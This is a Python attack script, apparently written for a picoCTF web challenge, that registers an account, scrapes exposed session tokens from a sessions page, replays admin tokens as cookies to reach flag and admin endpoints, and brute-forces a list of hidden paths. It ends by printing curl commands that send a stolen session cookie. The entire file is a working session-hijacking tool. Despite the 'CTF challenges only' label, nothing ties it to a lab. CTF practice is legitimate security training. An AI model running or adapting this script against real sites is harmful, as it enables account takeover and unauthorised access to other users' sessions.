
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')
#!/usr/bin/env python3
"""
CTF Session Hijacker - Auto Flag Grabber
==========================================
For picoCTF / CTF challenges only!
Usage: python3 ctf_session_hijack.py --url http://target:port
"""

import requests
import argparse
import sys
import re
from bs4 import BeautifulSoup

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    RED    = Fore.RED
    GREEN  = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN   = Fore.CYAN
    BOLD   = Style.BRIGHT
    RESET  = Style.RESET_ALL
except ImportError:
    RED = GREEN = YELLOW = CYAN = BOLD = RESET = ""

FLAG_PATTERN = re.compile(r'picoCTF\{[^}]+\}|CTF\{[^}]+\}|flag\{[^}]+\}', re.IGNORECASE)

def banner():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════╗
║     CTF Session Hijacker - Auto Flag Grabber ║
║     picoCTF / CTF challenges only!           ║
╚══════════════════════════════════════════════╝{RESET}
""")

def log(level, msg):
    icons = {
        "INFO":    f"{CYAN}[*]{RESET}",
        "SUCCESS": f"{GREEN}[+]{RESET}",
        "ERROR":   f"{RED}[-]{RESET}",
        "FLAG":    f"{BOLD}{GREEN}[FLAG]{RESET}",
        "WARN":    f"{YELLOW}[!]{RESET}",
    }
    print(f"  {icons.get(level,'[?]')} {msg}")

def check_flag(text, location=""):
    """Search for flag pattern in any text."""
    matches = FLAG_PATTERN.findall(text)
    if matches:
        for flag in matches:
            log("FLAG", f"FLAG FOUND at {location}: {BOLD}{GREEN}{flag}{RESET}")
        return matches
    return []

def get_form_fields(html, form_id=None):
    """Extract form field names from HTML."""
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form', id=form_id) if form_id else soup.find('form')
    if not form:
        return {}
    fields = {}
    for inp in form.find_all('input'):
        name = inp.get('name')
        val  = inp.get('value', '')
        typ  = inp.get('type', 'text')
        if name and typ not in ('submit', 'button'):
            fields[name] = val
    return fields

def step1_get_register_fields(base_url, session):
    """Fetch register page and extract field names."""
    log("INFO", "Fetching register page...")
    r = session.get(f"{base_url}/register", timeout=10)
    if r.status_code != 200:
        log("ERROR", f"Register page returned {r.status_code}")
        return {}
    fields = get_form_fields(r.text)
    log("INFO", f"Register form fields found: {list(fields.keys())}")
    return fields

def step2_register(base_url, session, fields, username="ctftest", password="ctfpass123"):
    """Register a new account."""
    log("INFO", f"Registering account: {username}")

    # Fill in the fields intelligently
    data = {}
    for field in fields:
        fl = field.lower()
        if 'user' in fl or 'name' in fl:
            data[field] = username
        elif 'confirm' in fl or 'conf' in fl:
            data[field] = password
        elif 'pass' in fl:
            data[field] = password
        else:
            data[field] = username

    r = session.post(
        f"{base_url}/register",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10,
        allow_redirects=True
    )

    check_flag(r.text, "/register response")

    if r.status_code in (200, 302):
        log("SUCCESS", f"Register request sent! Status: {r.status_code}")
        return True
    else:
        log("ERROR", f"Register failed: {r.status_code}")
        return False

def step3_login(base_url, session, username="ctftest", password="ctfpass123"):
    """Login with registered credentials."""
    log("INFO", f"Logging in as: {username}")

    # Get login form fields
    r = session.get(f"{base_url}/login", timeout=10)
    fields = get_form_fields(r.text)
    log("INFO", f"Login form fields: {list(fields.keys())}")

    data = {}
    for field in fields:
        fl = field.lower()
        if 'user' in fl or 'name' in fl:
            data[field] = username
        elif 'pass' in fl:
            data[field] = password

    r = session.post(
        f"{base_url}/login",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10,
        allow_redirects=True
    )

    check_flag(r.text, "/login response")

    if r.status_code in (200, 302):
        log("SUCCESS", f"Login request sent! Status: {r.status_code}")
        # Show current cookies
        for name, value in session.cookies.items():
            log("INFO", f"Cookie set: {name} = {value[:50]}{'...' if len(value)>50 else ''}")
        return True
    else:
        log("ERROR", f"Login failed: {r.status_code}")
        return False

def step4_find_sessions(base_url, session):
    """Find sessions page and extract all session tokens."""
    log("INFO", "Looking for sessions page...")

    session_paths = ["/sessions", "/session", "/admin/sessions",
                     "/api/sessions", "/users/sessions"]

    for path in session_paths:
        r = session.get(f"{base_url}{path}", timeout=10)
        if r.status_code == 200:
            log("SUCCESS", f"Sessions page found: {path}")

            # Check for flag directly
            check_flag(r.text, path)

            # Extract session tokens
            tokens = re.findall(
                r'session[:\s]+([A-Za-z0-9_\-]{20,})',
                r.text, re.IGNORECASE
            )

            # Also try to find key/username pairs
            admin_sessions = []
            lines = r.text.split('\n')
            for line in lines:
                if 'admin' in line.lower():
                    token_match = re.search(r'([A-Za-z0-9_\-]{20,})', line)
                    if token_match:
                        admin_sessions.append(token_match.group(1))
                        log("SUCCESS", f"Admin session found: {token_match.group(1)[:40]}...")

            if tokens:
                log("INFO", f"All session tokens found: {len(tokens)}")
                for t in tokens:
                    log("INFO", f"  Token: {t[:50]}")

            return tokens, admin_sessions, r.text

    log("WARN", "Sessions page not found on common paths")
    return [], [], ""

def step5_grab_flag(base_url, session, admin_tokens):
    """Try all admin tokens on flag/admin endpoints."""
    flag_paths = ["/flag", "/admin", "/admin/flag", "/secret",
                  "/dashboard", "/admin/dashboard", "/api/flag"]

    for token in admin_tokens:
        log("INFO", f"Trying admin token: {token[:40]}...")

        hijack_session = requests.Session()
        hijack_session.cookies.set("session", token)

        for path in flag_paths:
            r = hijack_session.get(f"{base_url}{path}", timeout=10)
            if r.status_code == 200:
                flags = check_flag(r.text, path)
                if flags:
                    return flags

                # Check if we got admin access
                if 'admin' in r.text.lower() and 'welcome' in r.text.lower():
                    log("SUCCESS", f"Admin access confirmed at {path}!")
                    log("INFO", f"Response preview: {r.text[:200]}")

                    # Try more paths now
                    for extra in ["/flag", "/secret", "/admin/flag"]:
                        r2 = hijack_session.get(f"{base_url}{extra}", timeout=10)
                        flags = check_flag(r2.text, extra)
                        if flags:
                            return flags

    return []

def step6_brute_endpoints(base_url, admin_tokens):
    """Brute force common endpoints with admin token."""
    log("INFO", "Brute forcing endpoints with admin session...")

    endpoints = [
        "/flag", "/Flag", "/FLAG",
        "/admin", "/admin/", "/Admin",
        "/secret", "/hidden", "/private",
        "/api/flag", "/api/secret",
        "/dashboard", "/panel",
        "/admin/flag", "/admin/secret",
    ]

    for token in admin_tokens:
        s = requests.Session()
        s.cookies.set("session", token)

        for ep in endpoints:
            r = s.get(f"{base_url}{ep}", timeout=5)
            if r.status_code == 200:
                flags = check_flag(r.text, ep)
                if flags:
                    return flags
                if len(r.text) > 10 and 'not found' not in r.text.lower():
                    log("INFO", f"Interesting endpoint {ep}: {r.text[:100]}")

    return []

def main():
    parser = argparse.ArgumentParser(
        description="CTF Session Hijacker — auto register, login, hijack admin session, get flag"
    )
    parser.add_argument("--url",      required=True, help="Target URL e.g. http://challenge.picoctf.net:PORT")
    parser.add_argument("--username", default="ctftest",    help="Username to register (default: ctftest)")
    parser.add_argument("--password", default="ctfpass123", help="Password to use (default: ctfpass123)")
    parser.add_argument("--token",    default=None, help="Provide known admin token directly")
    args = parser.parse_args()

    base_url = args.url.rstrip('/')
    banner()
    log("INFO", f"Target: {base_url}")
    print()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 CTF-Tool"})

    # ── If token provided directly, skip to flag grabbing
    if args.token:
        log("INFO", "Admin token provided directly — skipping to flag grab!")
        flags = step5_grab_flag(base_url, session, [args.token])
        if not flags:
            flags = step6_brute_endpoints(base_url, [args.token])
        if not flags:
            log("WARN", "Flag not found automatically — try manually!")
        return

    # ── Step 1: Get register form fields
    fields = step1_get_register_fields(base_url, session)
    if not fields:
        log("ERROR", "Could not get register form fields!")
        sys.exit(1)

    # ── Step 2: Register
    step2_register(base_url, session, fields, args.username, args.password)

    # ── Step 3: Login
    step3_login(base_url, session, args.username, args.password)

    # ── Step 4: Find sessions + admin tokens
    print()
    all_tokens, admin_tokens, raw = step4_find_sessions(base_url, session)

    if not admin_tokens and all_tokens:
        log("WARN", "No admin token found — trying all tokens...")
        admin_tokens = all_tokens

    if not admin_tokens:
        log("ERROR", "No session tokens found!")
        log("WARN", "Try visiting /sessions manually in browser first")
        sys.exit(1)

    # ── Step 5: Grab flag with admin token
    print()
    log("INFO", "Attempting flag grab with admin session...")
    flags = step5_grab_flag(base_url, session, admin_tokens)

    # ── Step 6: Brute force endpoints if needed
    if not flags:
        flags = step6_brute_endpoints(base_url, admin_tokens)

    print()
    if flags:
        print(f"\n{BOLD}{GREEN}{'='*50}")
        print(f"  FLAG: {flags[0]}")
        print(f"{'='*50}{RESET}\n")
    else:
        log("WARN", "Automatic flag grab failed!")
        log("INFO", "Try manually:")
        for token in admin_tokens[:2]:
            print(f"\n  curl {base_url}/flag -H 'Cookie: session={token}'")

if __name__ == "__main__":
    main()
